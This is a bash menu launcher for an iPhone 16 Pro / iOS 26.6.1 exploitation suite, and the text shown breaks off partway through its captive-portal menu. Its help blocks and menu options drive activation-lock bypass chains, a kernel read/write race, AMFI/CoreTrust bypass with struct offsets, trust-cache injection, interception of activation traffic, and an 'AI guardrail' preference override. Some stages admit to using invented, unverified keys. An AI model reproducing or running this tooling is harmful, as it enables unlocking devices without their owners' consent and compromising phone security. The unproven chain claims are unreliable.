#!/usr/bin/env bash
#
# start.sh - Interactive Terminal Interface for l0fck
# iPhone 16 Pro / A18 Pro / iOS 26.6.1 Dedicated Security Research Suite
#

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

# Color Codes
CYAN="\033[1;36m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
RED="\033[1;31m"
MAGENTA="\033[1;35m"
BOLD="\033[1m"
RESET="\033[0m"

# ---------------------------------------------------------------------------
# Banner & UI helpers
# ---------------------------------------------------------------------------

print_banner() {
    clear
    echo -e "${CYAN}${BOLD}"
    echo "  _   ___   __      _    "
    echo " | | / _ \\ / _| ___| | __"
    echo " | || | | | |_ / __| |/ /"
    echo " | || |_| |  _| (__|   < "
    echo " |_(_)___/|_|  \\___|_|\\_\\"
    echo " iPhone 16 Pro / A18 Pro / iOS 26.6.1 Security Research Suite"
    echo " Version 1.0.0 [A18Pro-Titan]"
    echo -e "${RESET}"
    echo -e "${BOLD}Target Hardware:${RESET}  Apple A18 Pro (CPID 0x8140, iPhone17,1 / iPhone17,2)"
    echo -e "${BOLD}Target Firmware:${RESET}  iOS 26.6.1 (Build 23G83)"
    echo "----------------------------------------------------------------------"
}

prompt_yes_no() {
    local prompt="$1"
    local answer
    echo -ne "${YELLOW}${prompt} [Y/n]: ${RESET}"
    read -r answer
    [[ -z "$answer" || "$answer" =~ ^[Yy]$ ]]
}

press_enter() {
    echo ""
    echo -e "${YELLOW}Press [Enter] to return to the menu...${RESET}"
    read -r
}

show_confirmation() {
    local opt_num="$1"
    local title="$2"
    local command_preview="$3"
    local device_state="$4"
    local risk_label="$5"
    local doc_fn="$6"
    local art_fn="$7"

    print_banner
    echo -e "${CYAN}${BOLD}SELECTED OPTION${RESET}"
    echo -e "  ${opt_num}. ${title}"
    echo ""
    echo -e "${BOLD}COMMAND${RESET}"
    echo -e "  ${command_preview}"
    echo ""
    echo -e "${BOLD}DEVICE STATE${RESET}"
    echo -e "  ${device_state}"
    echo ""
    echo -e "${BOLD}RISK${RESET}"
    echo -e "  ${risk_label}"
    echo ""
    echo -e "${BOLD}DOCUMENTATION${RESET}"
    if declare -f "$doc_fn" > /dev/null 2>&1; then
        "$doc_fn"
    fi
    echo ""
    echo -e "${CYAN}${BOLD}FLOW${RESET}"
    if declare -f "$art_fn" > /dev/null 2>&1; then
        echo -e "${CYAN}"
        "$art_fn"
        echo -e "${RESET}"
    fi
    echo ""
}

run_confirmed() {
    local opt_num="$1"
    local title="$2"
    local command_preview="$3"
    local device_state="$4"
    local risk_label="$5"
    local doc_fn="$6"
    local art_fn="$7"
    shift 7

    show_confirmation "$opt_num" "$title" "$command_preview" "$device_state" "$risk_label" "$doc_fn" "$art_fn"

    if prompt_yes_no "Proceed?"; then
        "$@"
        press_enter
    else
        echo -e "${YELLOW}Cancelled. Returning to menu.${RESET}"
        sleep 1
    fi
}

# ---------------------------------------------------------------------------
# Documentation blocks (from PLAN/docs_for_plan_8_v2.md)
# ---------------------------------------------------------------------------

print_doc_generic_readonly() {
    cat <<'EOF'
Read-only diagnostic action. Inspects device state without modifying
activation, filesystem, or lockdown configuration.
EOF
}

print_doc_generic_write() {
    cat <<'EOF'
Writes to device state, preferences, or lockdown configuration.
Ensure the device is USB-connected and in a reachable boot state.
EOF
}

print_doc_preboard_race() {
    cat <<'EOF'
[RESEARCH-ONLY / UNPROVEN (D1)]
VUL 23 TOCTOU race between preboardservice_v2 disruption and
mobileactivationd activation handling. Targets Setup Assistant /
pre-activation state.

WARNING: this path fires non-standard plist commands to
com.apple.preboardservice_v2 (CreateStashbag/CommitStashbag/StashbagMode/
SkipAuthCheck) that are NOT confirmed to exist on the target. No crash or
state-change has been verified on the real device. The production activation
path is the Wi-Fi GlyphGrift (CVE-2026-86950) chain, not this race.

Known limitation: SEP-backed cryptographic
validation may still reject the activation record.
EOF
}

print_doc_albert_tls() {
    cat <<'EOF'
Albert DRM handshake and TLS pinning bypass for local research.
Use with captive portal to inspect or redirect activation traffic.
Hooks tls-error signals in WebKitGTK-based clients.
EOF
}

print_doc_neo_chain() {
    cat <<'EOF'
Neo-Chain uses AppleAVE2 CVE-2026-84607 eEncType race condition 
for kernel R/W on A18 Pro. Stages: kernel R/W, AMFI/CoreTrust bypass 
(trust_cache_rt), SEP/NVRAM, persistence, verify. Blocked stages fall 
back per awaiting_offsets.txt.
EOF
}

print_doc_bypass_full() {
    cat <<'EOF'
Full 5-stage activation bypass chain: AFC staging, online activation
or VUL 23 race fallback (RESEARCH-ONLY / UNPROVEN - invented keys),
crash triage, Darwin notification burst, and live SpringBoard transition.
Does not require kernel exploitation.
EOF
}

print_doc_sovereign() {
    cat <<'EOF'
Sovereign-Chain hybrid security degradation: Stage 1 applies dual-vector
memory pressure (NECP wired-memory spray + IOSurface allocation) to degrade
priority-40 security daemons (secinitd, cryptexd). Stage 2 stages AI
guardrail preference overrides via AFC. Stage 3 runs the full 5-stage
activation bypass chain (AFC staging, online/VUL 23 race, triage,
notifications, SpringBoard transition). Userspace-only; no kernel exploit.
EOF
}

print_doc_sovereign_lite() {
    cat <<'EOF'
Sovereign-Lite: high-reliability state manipulation without the full
activation bypass chain. Shares Stages 1-2 with Sovereign-Chain (NECP/
IOSurface memory pressure + AI guardrail AFC overrides), then pivots to
lockdown flag injection (PurpleBuddy/hactivation bypass keys), a 14-event
Darwin setup-dismissal notification burst, and a diagnostics-relay respring.
Skips online activation, VUL 23 race, and crash triage. Userspace-only.
EOF
}

print_doc_self_test() {
    cat <<'EOF'
Host-only embedded unit test suite (22 tests). Validates parsers,
synthesizers, and lifecycle helpers without a connected device:
Port DFU serial parser, Base64 codec, A18 target gating, activation
record synthesizer, DNS/HTTP captive parsers, mobileconfig generator,
root CA PEM, .IPS crash triage parser, PurpleBuddy/SpringBoard plist
synthesizers, session manager init, SetupAssistant/iTunes plists,
AppleAVE2 portal telemetry parser, SetupAssistant activation engine,
KASLR slide & slid addressing, KRW HTTP C2 bridge with dynamic
discovery (allproc walk, DeviceTree, PTOV table simulation), GlyphGrift
PDF payload/telemetry lifecycle, GlyphGrift V2 exploit telemetry
(crash≠krw_ready, k128/k192 PDFs), KASLR anchor table, sentinel canary
read-back, renderer heartbeat, and Restore-Chain manifest/mbdb
synthesizer with domain-escape traversal round-trip.
EOF
}

print_doc_test_kernel_exploit() {
    cat <<'EOF'
Isolated kernel R/W primitive test (not the full Neo-Chain). Primary:
AppleAVE2 CVE-2026-84607 eEncType race condition via IOKit or portal
WebCodecs. Fallback 1: V-047 AppleJPEGDriver OOB write (startDecoderExt,
IOSurface heap groom, NECP PGZ spray). Fallback 2: AppleMCCUserClientV2
testMode (selectors 0x12/0x7/0x8/0x10). On success, probes kread64
against allproc using iOS 26.6.1 T8140 offsets with PAC pointer
stripping. Host orchestration only; live IOKit exploitation requires
an on-device payload or WebSheet captive portal.
EOF
}

print_doc_test_amfi_bypass() {
    cat <<'EOF'
Isolated AMFI/CoreTrust bypass test (not the full Neo-Chain). Obtains
kernel R/W (AppleAVE2 primary, V-047 or MCC fallback), walks allproc
with PAC stripping for process enumeration (struct_size 0x750, p_name
+0x4d8), disarms security daemons via proc.p_flag (+0x454) P_AMFI_DISABLED
bit patching, then tests trust_cache_rt cave injection (writable cave
discovery + CDHash write + pointer update) and CoreTrust cs_blob
validation patch.
EOF
}

print_doc_captive() {
    cat <<'EOF'
Local DNS/HTTP/TLS captive portal for WebSheet research. Intercepts
activation-related traffic. Privileged ports (53/80/443) require sudo.
EOF
}

print_doc_setup_assistant_chain() {
    cat <<'EOF'
Wi-Fi Portal & Setup Assistant AppleAVE2 Video Kernel Exploit & Activation Chain:
Full End-to-End Chain: Soft AP -> WebSheet -> AppleAVE2 Win -> Device Activation.
Launches captive DNS (53), HTTP (80), and TLS (443) servers to intercept
Apple CNA probe queries from an unactivated device in Setup Assistant.
Automatically pops up WebSheet on the device, executes loader.js recon,
and triggers the AppleAVE2 (CVE-2026-84607) eEncType state management race
directly from WebSheet via WebCodecs VideoEncoder to the WebKit GPU process
and kernel AppleAVE2Driver.
Once kernel R/W is won:
1. Injects CoreTrust trust cache and disarms AMFI/SEP kernel hooks.
2. Transitions Wi-Fi Captive Portal to Success mode (dismissing WebSheet).
3. Serves synthesized A18 Pro activation record on /deviceservices/deviceActivation.
4. When USB is connected, injects MobileActivation & PurpleBuddy flags, stages
   preferences to Media partition, broadcasts 14 Darwin setup dismissal
   notifications, and resprings directly into the unlocked Home Screen.
EOF
}

print_doc_glyphgrift_chain() {
    cat <<'EOF'
CVE-2026-86950 GlyphGrift V2 — Coverage Buffer Shaping & Controlled Primitive:
Soft AP → WebSheet heap spray (bmalloc 48-256B multi-zone) → multi-PDF OOB
(k128, k192, and DX 33-40 sweep; up to 5 retry rounds) → corruption scan →
captive_krw bridge → AMFI/SEP/activation.
Stages 0–4 unchanged (trigger/telemetry). Stages 5–8 auto-chain after the
OOB path (no operator y/N). Crash/OOB alone never implies kernel R/W.
Operator selects delivery vector before start:
  1) <img> ImageIO thumbnail path (in-process)
  2) <object> inline CG PDF render path
Heap-only for exploit stages; --glyphgrift-stack remains research-only.
Fixed in iOS 26.7.1. Target iOS 26.6.1 (23G83) is vulnerable.
EOF
}

print_doc_restore_chain() {
     cat <<'EOF'
CVE-2026-84598 class — MobileBackup2 (com.apple.mobilebackup2) restore-
staging path-traversal chain. Over a plain USB lockdown connection (no
kernel exploit, no Wi-Fi) the host drives a full mb2 restore session:
version exchange -> "Hello" (SupportedProtocolVersions [2.0, 2.1]) ->
serve Manifest.plist (Version 8.0, SystemDomainsVersion 19.0) -> stream a
synthesized .mbdb (magic "mbdb", major 1, per-entry domain/path/props
bplist) over the device-link file stream, where phase-1 entries use
domain escapes (SysContainerDomain-../..) to stage canary files at the
/var/mobile/Media in-jail root and /var/tmp, and phase-2 entries plant
purplebuddy / SetupAssistant unlock plists under /var/mobile/Library.
A hard gate (stage 4) re-reads the phase-1 canary over plain AFC before
any unlock stage runs; if the traversal did not materialize at copy time
the chain stops honestly (parse-accept alone is not a write primitive).
On confirmation it reuses the proven post-exploit stack: lockdown flag
 injection, synthesized offline A18 Pro activation, SpringBoard/Setup
 preferences, a 14-event Darwin dismissal burst, and a respring into the
 unlocked Home Screen. Target gate: A18 Pro / iOS 26.6.1 (23G83).

 TRANSPORT (by target): on the A18 Pro the legacy-lockdown
 com.apple.mobilebackup2 service is NOT registered (idevicebackup2:
 TLS + notification_proxy + AFC OK, then StartService com.apple.mobilebackup2
 -> InvalidService, even on a paired host). So the mb2 session runs over the
 CoreDevice RSD transport (service com.apple.mobilebackup2.shim.remote) via a
 bundled pymobiledevice3 sidecar (l0fck/tools/mb2_coredevice.py, venv
 l0fck/tools/.venv); the host must be paired + trusted AND CoreDevice-paired
 (Developer Mode on). A13-class devices use the legacy lockdown path unchanged.
 Phase 0 probe: l0fck/tools/mb2_reachability.py (REACHABLE gates Phase 1).
EOF
}

# ---------------------------------------------------------------------------
# ASCII art blocks
# ---------------------------------------------------------------------------

print_art_generic() {
    cat <<'EOF'
  host (l0fck)  --->  USB/lockdown  --->  device services
EOF
}

print_art_preboard_race() {
    cat <<'EOF'
thread A: preboard fault  ----\
                               +--> timing window --> activation submit
thread B: activation request --/
EOF
}

print_art_albert_tls() {
    cat <<'EOF'
Albert traffic
      |
      v
+-------------+      TLS failure event      +----------------+
| WebKit/GTLS | --------------------------> | local override |
+-------------+                             +-------+--------+
                                                   |
                                                   v
                                           controlled test endpoint
EOF
}

print_art_neo_chain() {
    cat <<'EOF'
+---------------------------------------------------------------------+
|                        NEO-CHAIN EXECUTION FLOW                     |
+---------------------------------------------------------------------+
|  STAGE 0: RECON (A18 Pro, MTE absent)                               |
|  STAGE 1: KERNEL R/W (AppleAVE2 CVE-2026-84607)                     |
|  STAGE 2: AMFI / CoreTrust (CVMServer + trust_cache_rt)             |
|  STAGE 3: SEP / MobileActivation (NVRAM via PMAP)                   |
|  STAGE 4: PERSISTENCE (AFC staging, IOMFB blocked)                  |
|  STAGE 5: CLEANUP (respring, verify)                                |
+---------------------------------------------------------------------+
EOF
}

print_art_bypass_full() {
    cat <<'EOF'
Stage 1-2: AFC staging + activation (online or VUL 23 race)
Stage 3:   Crash triage & telemetry
Stage 4:   Darwin setup dismissal notifications
Stage 5:   Live SpringBoard home screen transition
EOF
}

print_art_sovereign() {
    cat <<'EOF'
+---------------------------------------------------------------------+
|                   SOVEREIGN-CHAIN EXECUTION FLOW                    |
+---------------------------------------------------------------------+
|  STAGE 1: DUAL-VECTOR MEMORY PRESSURE                               |
|    NECP wired-memory spray + IOSurface allocation                   |
|    -> degrade secinitd / cryptexd (priority-40 daemons)             |
|                                                                     |
|  STAGE 2: AI GUARDRAIL BYPASS                                       |
|    AFC preference overrides (disableToolBoxAllowList, etc.)         |
|                                                                     |
|  STAGE 3: FULL 5-STAGE BYPASS CHAIN                                 |
|    AFC staging -> activation/VUL 23 race -> triage ->              |
|    Darwin notifications -> SpringBoard home screen transition       |
+---------------------------------------------------------------------+
EOF
}

print_art_sovereign_lite() {
    cat <<'EOF'
+---------------------------------------------------------------------+
|                   SOVEREIGN-LITE EXECUTION FLOW                     |
+---------------------------------------------------------------------+
|  STAGE 1: DUAL-VECTOR MEMORY PRESSURE                               |
|    NECP wired-memory spray + IOSurface allocation                   |
|    -> degrade secinitd / cryptexd (priority-40 daemons)             |
|                                                                     |
|  STAGE 2: AI GUARDRAIL BYPASS                                       |
|    AFC preference overrides (disableToolBoxAllowList, etc.)         |
|                                                                     |
|  STAGE 3: DEEP LOCKDOWN FLAG INJECTION                              |
|    PurpleBuddy & hactivation bypass keys via lockdownd              |
|                                                                     |
|  STAGE 4: SETUP DISMISSAL NOTIFICATION BURST                        |
|    14 Darwin notifications -> SpringBoard / Setup.app handoff       |
|                                                                     |
|  STAGE 5: UI REFRESH (RESPRING)                                     |
|    diagnostics_relay respring -> Home Screen transition              |
+---------------------------------------------------------------------+
EOF
}

print_art_self_test() {
    cat <<'EOF'
./l0fck --test  (host only, no USB device)
        |
        +-- Parsers: Port DFU serial, DNS query, HTTP request, .IPS
        +-- Codecs:  Base64 encode/decode
        +-- Synth:   A18 activation record, PurpleBuddy/SpringBoard
        |            SetupAssistant/iTunes plists, mobileconfig, CA PEM
        +-- Gating:  A18 Pro / iOS 26.6.1 target validator
        +-- Lifecycle: session manager struct init
        +-- AppleAVE2: portal telemetry parser & kbase validator
        +-- Activation: SetupAssistant post-exploit force-success engine
        +-- Kernel:  KASLR slide & slid address calculation
        +-- Bridge:  KRW HTTP C2 bridge & dynamic allproc/PTOV discovery
        +-- GlyphGrift: trigger.pdf presence & telemetry reset/get
        +-- GlyphGrift V2: exploit telem + k128/k192 PDF variants
EOF
}

print_art_test_kernel_exploit() {
    cat <<'EOF'
Primary (AppleAVE2 CVE-2026-84607):
WebSheet / IOKit app
     |
     v
+-------------------+  codec switch race  +-------------------+
| VideoEncoder /    | ------------------> | AppleAVE2Driver   |
| IOKit UserClient  |                     | sEnc.eType desync |
+-------------------+                     +--------+----------+
                                                   |
                                                   v
                                          kernel R/W primitive
                                                   |
                                                   v
                                          kread64(allproc) + PAC strip

Fallback 1 (V-047):
+-------------------+   malformed decoder req   +----------------+
| IOKit connection  | ------------------------> | AppleJPEGDriver |
+-------------------+                           +-------+--------+
                                                        |
                                                        v
                                               kernel heap overwrite

Fallback 2 (MCC):
+-----------+  sel 0x12/0x7/0x8/0x10  +----------------------+
| l0fck host| ----------------------> | AppleMCCUserClientV2 |
+-----------+                         +----------+-----------+
                                                |
                                                v
                                    test data stream / kernel mem map
EOF
}

print_art_test_amfi_bypass() {
    cat <<'EOF'
kernel R/W (AppleAVE2 primary, V-047/MCC fallback)
        |
        +--> allproc walk + PAC strip (struct_size 0x750, p_name +0x4d8)
        |         |
        |         v
        |    process enumeration (mobileactivationd, amfid, SpringBoard)
        |
        +--> proc.p_flag (+0x454) P_AMFI_DISABLED bit patching
        |         |
        |         v
        |    security daemon disarm (per-process)
        |
        +--> trust_cache_rt cave injection (writable cave discovery)
        |         |
        |         v
        |    CDHash --> cave --> update trust_cache_rt pointer
        |
        +--> CoreTrust cs_blob validation patch (data-only)
EOF
}

print_art_glyphgrift_chain() {
    cat <<'EOF'
  iPhone (Setup Assistant)  --->  Soft AP / Wi-Fi  --->  Captive DNS/HTTP
           |                                                 |
           v                                                 v
  WebSheet V2 HTML         <--- multi-zone + DX sweep   <--- l0fck Host
           |
           +--> Stage5: bmalloc ArrayBuffer spray (48-256B, 1024/zone)
           +--> Stage6: k128 -> k192 -> DX 33-40 sweep (up to 5 rounds)
           |         |
           |         v
           |    aa_cache_render OOB → adjacent spray corruption?
           |
           +--> POST /api/glyphgrift-exploit-result
           +--> Stage7: authentic kbase → captive_krw bridge
           +--> Stage8: AMFI / SEP / activation (reuse SetupAssistant)
EOF
}

print_art_setup_assistant_chain() {
    cat <<'EOF'
  iPhone (Setup Assistant)  --->  Soft AP / Wi-Fi  --->  Captive DNS/HTTP
             |                                                 |
             v                                                 v
    WebSheet.app opens     <--- Serves WebCodecs Race <---  l0fck Host Engine
             |                                                 |
             +---> VideoEncoder eEncType State Race            |
             |     Kernel R/W Won (kbase verified)             v
             |        |                                 Stage 6: Kernel R/W & AMFI
             |        +---> POST /api/appleave2-result  Stage 7: CNA Success Release
             v                                                 |
    WebSheet Dismissed     <--- Serves 'Success' & Albert <----+
             |
              +---> Optional USB Attachment:
                       |---> Flag Injection (ActivationState=Activated)
                       |---> Offline A18 Pro Activation Record
                       |---> 14 Darwin Dismissal Broadcasts
                       `---> SpringBoard Respring -> Unlocked Home Screen!
EOF
}

print_art_restore_chain() {
     cat <<'EOF'
+---------------------------------------------------------------------+
|                 RESTORE-CHAIN (MobileBackup2 Traversal)             |
+---------------------------------------------------------------------+
|  STAGE 0: PREFLIGHT (A18 Pro / iOS 26.6.1 gate, Find My manual off) |
|  STAGE 1: MB2 SESSION (lockdown service, v400/0, Hello [2.0, 2.1])  |
|  STAGE 2: MANIFEST + .MBDB STREAM (domain escapes -> canary files)  |
|  STAGE 3: 211 GATE RETRY (max 3 rounds; wedge -> reboot recovery)   |
|  STAGE 4: HARD GATE (plain-AFC canary read = confirmed write)       |
|  STAGE 5: UNLOCK ARTIFACTS (purplebuddy/SetupAssistant plists)      |
|  STAGE 6: FINALIZE (flags, offline activation, Darwin burst,        |
|            respring -> unlocked Home Screen)                        |
+---------------------------------------------------------------------+
EOF
}

# ---------------------------------------------------------------------------
# Dependency & build
# ---------------------------------------------------------------------------

check_dependencies() {
    echo -e "${CYAN}[*] Validating build dependencies via pkg-config...${RESET}"
    DEPS=("libimobiledevice-1.0" "libirecovery-1.0" "libusb-1.0" "libplist-2.0" "openssl" "libcurl")
    MISSING=0
    for dep in "${DEPS[@]}"; do
        if ! pkg-config --exists "$dep" 2>/dev/null; then
            echo -e "${RED}[!] Missing dependency: $dep${RESET}"
            MISSING=1
        fi
    done

    if [ $MISSING -eq 1 ]; then
        echo -e "${YELLOW}[*] On macOS, run: brew install libimobiledevice libirecovery libusb libplist openssl curl pkg-config${RESET}"
        exit 1
    fi
}

ensure_built() {
    if [ ! -f "$SCRIPT_DIR/l0fck" ]; then
        echo -e "${YELLOW}[*] l0fck binary not found. Building from source...${RESET}"
        make
        echo -e "${GREEN}[+] Build complete!${RESET}"
        sleep 1
    fi
}

# ---------------------------------------------------------------------------
# Section menus
# ---------------------------------------------------------------------------

menu_device_discovery() {
    while true; do
        print_banner
        echo -e "${CYAN}${BOLD}Device Discovery${RESET}"
        echo ""
        echo -e "${BOLD}1.${RESET}  Detect Device & Hardware Compatibility Check"
        echo -e "${BOLD}2.${RESET}  Port DFU Mode Analysis (PID 05ac:f014)"
        echo -e "${BOLD}3.${RESET}  Scan All USB Apple Devices Across Modes"
        echo ""
        echo -e "${BOLD}B.${RESET}  Back"
        echo -e "${BOLD}0.${RESET}  Exit"
        echo "----------------------------------------------------------------------"
        echo -n "Select an option [1-3, B, 0]: "
        read -r choice

        case "$choice" in
            1) run_confirmed "1" "Detect Device & Hardware Compatibility" \
                "./l0fck --detect" \
                "ON or DFU, USB-connected" \
                "${GREEN}Safe / read-only${RESET}" \
                print_doc_generic_readonly print_art_generic \
                ./l0fck --detect ;;
            2) run_confirmed "2" "Port DFU Mode Analysis" \
                "./l0fck --port-dfu" \
                "Port DFU mode (PID 05ac:f014)" \
                "${GREEN}Safe / read-only${RESET}" \
                print_doc_generic_readonly print_art_generic \
                ./l0fck --port-dfu ;;
            3) run_confirmed "3" "Scan All USB Apple Devices" \
                "./l0fck --usb-scan" \
                "Any USB-connected Apple device" \
                "${GREEN}Safe / read-only${RESET}" \
                print_doc_generic_readonly print_art_generic \
                ./l0fck --usb-scan ;;
            [Bb]) return ;;
            0) echo -e "\n${CYAN}Exiting l0fck. Goodbye!${RESET}\n"; exit 0 ;;
            *) echo -e "\n${RED}Invalid selection.${RESET}"; sleep 1 ;;
        esac
    done
}

menu_lockdown_afc() {
    while true; do
        print_banner
        echo -e "${CYAN}${BOLD}Lockdown / AFC${RESET}"
        echo ""
        echo -e "${BOLD}1.${RESET}  Audit Unauthenticated Lockdown Services (Vuln #02)"
        echo -e "${BOLD}2.${RESET}  Browse /var/mobile/Media/ Partition via AFC"
        echo -e "${BOLD}3.${RESET}  Inject Persistent PurpleBuddy & Bypass Flags"
        echo -e "${BOLD}4.${RESET}  Verify Lockdownd Configuration Flags"
        echo -e "${BOLD}5.${RESET}  Stream Live Device Syslog"
        echo -e "${BOLD}6.${RESET}  Reboot Device Safely via Diagnostics Relay"
        echo ""
        echo -e "${BOLD}B.${RESET}  Back"
        echo -e "${BOLD}0.${RESET}  Exit"
        echo "----------------------------------------------------------------------"
        echo -n "Select an option [1-6, B, 0]: "
        read -r choice

        case "$choice" in
            1) run_confirmed "1" "Audit Unauthenticated Lockdown Services" \
                "./l0fck --probe-services -v" \
                "ON, USB-connected, lockdown reachable" \
                "${GREEN}Safe / read-only${RESET}" \
                print_doc_generic_readonly print_art_generic \
                ./l0fck --probe-services -v ;;
            2)
                print_banner
                echo -n "Enter remote path on /var/mobile/Media/ [/]: "
                read -r afc_path
                if [ -z "$afc_path" ]; then afc_path="/"; fi
                run_confirmed "2" "Browse AFC Media Partition" \
                    "./l0fck --afc-ls ${afc_path}" \
                    "ON, USB-connected, AFC accessible" \
                    "${GREEN}Safe / read-only${RESET}" \
                    print_doc_generic_readonly print_art_generic \
                    ./l0fck --afc-ls "$afc_path" ;;
            3) run_confirmed "3" "Inject PurpleBuddy & Bypass Flags" \
                "./l0fck --inject-flags" \
                "ON, USB-connected, lockdown reachable" \
                "${YELLOW}Caution: writes lockdown flags${RESET}" \
                print_doc_generic_write print_art_generic \
                ./l0fck --inject-flags ;;
            4) run_confirmed "4" "Verify Lockdownd Configuration Flags" \
                "./l0fck --verify-flags" \
                "ON, USB-connected, lockdown reachable" \
                "${GREEN}Safe / read-only${RESET}" \
                print_doc_generic_readonly print_art_generic \
                ./l0fck --verify-flags ;;
            5)
                print_banner
                echo -n "Enter stream duration in seconds [10]: "
                read -r dur
                if [ -z "$dur" ]; then dur=10; fi
                run_confirmed "5" "Stream Live Device Syslog" \
                    "./l0fck --syslog ${dur}" \
                    "ON, USB-connected, lockdown reachable" \
                    "${GREEN}Safe / read-only${RESET}" \
                    print_doc_generic_readonly print_art_generic \
                    ./l0fck --syslog "$dur" ;;
            6) run_confirmed "6" "Reboot Device Safely" \
                "./l0fck --reboot" \
                "ON, USB-connected, lockdown reachable" \
                "${YELLOW}Caution: device reboot${RESET}" \
                print_doc_generic_write print_art_generic \
                ./l0fck --reboot ;;
            [Bb]) return ;;
            0) echo -e "\n${CYAN}Exiting l0fck. Goodbye!${RESET}\n"; exit 0 ;;
            *) echo -e "\n${RED}Invalid selection.${RESET}"; sleep 1 ;;
        esac
    done
}

menu_activation_albert() {
    while true; do
        print_banner
        echo -e "${CYAN}${BOLD}Activation / Albert${RESET}"
        echo ""
        echo -e "${BOLD}1.${RESET}  Albert DRM Handshake & IngestBody Inspection Probe"
        echo -e "${BOLD}2.${RESET}  Execute Full 5-Stage Online Albert Activation"
        echo -e "${BOLD}3.${RESET}  Execute VUL 23 TOCTOU Race Activation  ${YELLOW}[RESEARCH/UNPROVEN]${RESET}"
        echo -e "${BOLD}4.${RESET}  Deactivate Device Activation State"
        echo ""
        echo -e "${BOLD}B.${RESET}  Back"
        echo -e "${BOLD}0.${RESET}  Exit"
        echo "----------------------------------------------------------------------"
        echo -n "Select an option [1-4, B, 0]: "
        read -r choice

        case "$choice" in
            1) run_confirmed "1" "Albert DRM Handshake Probe" \
                "./l0fck --probe-albert" \
                "ON, USB-connected, activation state available" \
                "${GREEN}Safe / read-only${RESET}" \
                print_doc_albert_tls print_art_albert_tls \
                ./l0fck --probe-albert ;;
            2) run_confirmed "2" "Full Online Albert Activation" \
                "./l0fck --activate-online" \
                "ON, USB-connected, network available" \
                "${YELLOW}Caution: modifies activation state${RESET}" \
                print_doc_albert_tls print_art_albert_tls \
                ./l0fck --activate-online ;;
            3) run_confirmed "3" "VUL 23 TOCTOU Race Activation [RESEARCH/UNPROVEN]" \
                "./l0fck --activate-race" \
                "ON, Setup Assistant / pre-activation state" \
                "${YELLOW}RESEARCH-ONLY / UNPROVEN (D1): fires invented preboardservice_v2 keys, unverified. Wi-Fi GlyphGrift chain is the production path.${RESET}" \
                print_doc_preboard_race print_art_preboard_race \
                ./l0fck --activate-race ;;
            4) run_confirmed "4" "Deactivate Device" \
                "./l0fck --deactivate" \
                "ON, USB-connected, lockdown reachable" \
                "${RED}Danger: removes activation${RESET}" \
                print_doc_generic_write print_art_generic \
                ./l0fck --deactivate ;;
            [Bb]) return ;;
            0) echo -e "\n${CYAN}Exiting l0fck. Goodbye!${RESET}\n"; exit 0 ;;
            *) echo -e "\n${RED}Invalid selection.${RESET}"; sleep 1 ;;
        esac
    done
}

menu_preboard() {
    while true; do
        print_banner
        echo -e "${CYAN}${BOLD}Preboard / Setup Assistant${RESET}"
        echo ""
        echo -e "${BOLD}1.${RESET}  Run Preboard Service Crash PoC (Vulnerability #23)"
        echo -e "${BOLD}2.${RESET}  Auto-Triage Preboard Crash & Fetch .IPS Dump"
        echo -e "${BOLD}3.${RESET}  Stage Disk Preferences to Media Partition (AFC)"
        echo -e "${BOLD}4.${RESET}  Execute Weaponized Preboard Exploit"
        echo ""
        echo -e "${BOLD}B.${RESET}  Back"
        echo -e "${BOLD}0.${RESET}  Exit"
        echo "----------------------------------------------------------------------"
        echo -n "Select an option [1-4, B, 0]: "
        read -r choice

        case "$choice" in
            1) run_confirmed "1" "Preboard Service Crash PoC" \
                "./l0fck --crash-preboard" \
                "ON, Setup Assistant / pre-activation state" \
                "${YELLOW}Caution: crashes preboardservice_v2${RESET}" \
                print_doc_preboard_race print_art_preboard_race \
                ./l0fck --crash-preboard ;;
            2) run_confirmed "2" "Auto-Triage Preboard Crash" \
                "./l0fck --triage-crash" \
                "ON, after preboard crash" \
                "${GREEN}Safe / read-only (fetches crash report)${RESET}" \
                print_doc_preboard_race print_art_preboard_race \
                ./l0fck --triage-crash ;;
            3) run_confirmed "3" "Stage Disk Preferences to AFC" \
                "./l0fck --stage-bypass" \
                "ON, USB-connected, AFC accessible" \
                "${YELLOW}Caution: writes preference plists${RESET}" \
                print_doc_preboard_race print_art_preboard_race \
                ./l0fck --stage-bypass ;;
            4) run_confirmed "4" "Weaponized Preboard Exploit" \
                "./l0fck --exploit-preboard" \
                "ON, Setup Assistant / pre-activation state" \
                "${RED}Danger: privilege escalation attempt${RESET}" \
                print_doc_preboard_race print_art_preboard_race \
                ./l0fck --exploit-preboard ;;
            [Bb]) return ;;
            0) echo -e "\n${CYAN}Exiting l0fck. Goodbye!${RESET}\n"; exit 0 ;;
            *) echo -e "\n${RED}Invalid selection.${RESET}"; sleep 1 ;;
        esac
    done
}

menu_captive_portal() {
    while true; do
        print_banner
        echo -e "${CYAN}${BOLD}Captive Portal${RESET}"
        echo ""
        echo -e "${BOLD}1.${RESET}  Launch Captive Portal (user ports: 8080/5353/8443)"
        echo -e "${BOLD}2.${RESET}  Launch Captive Portal (privileged ports: 80/53/443) [sudo]"
        echo -e "${BOLD}3.${RESET}  Export Research .mobileconfig Profile"
        echo ""
        echo -e "${BOLD}B.${RESET}  Back"
        echo -e "${BOLD}0.${RESET}  Exit"
        echo "----------------------------------------------------------------------"
        echo -n "Select an option [1-3, B, 0]: "
        read -r choice

        case "$choice" in
            1)
                print_banner
                echo -n "Enter HTTP server port [8080]: "
                read -r c_port
                if [ -z "$c_port" ]; then c_port=8080; fi
                echo -n "Enter DNS responder port [5353]: "
                read -r d_port
                if [ -z "$d_port" ]; then d_port=5353; fi
                echo -n "Open host admin dashboard in browser? (Y/n): "
                read -r open_dash
                local cmd="./l0fck --captive-server ${c_port} --captive-dns-port ${d_port}"
                run_confirmed "1" "Captive Portal (user ports)" \
                    "$cmd" \
                    "ON device on same network; host listening" \
                    "${YELLOW}Caution: long-running, network interception${RESET}" \
                    print_doc_captive print_art_albert_tls \
                    bash -c "
                        if [[ ! '${open_dash:-}' =~ ^[Nn]$ ]]; then
                            (sleep 1 && open 'http://localhost:${c_port}/admin') &
                        fi
                        ./l0fck --captive-server '${c_port}' --captive-dns-port '${d_port}'
                    " ;;
            2) run_confirmed "2" "Captive Portal (privileged ports)" \
                "sudo ./l0fck --captive-server 80 --captive-dns-port 53 --captive-tls-port 443" \
                "ON device on same network; requires sudo" \
                "${RED}Danger: privileged ports, network interception${RESET}" \
                print_doc_captive print_art_albert_tls \
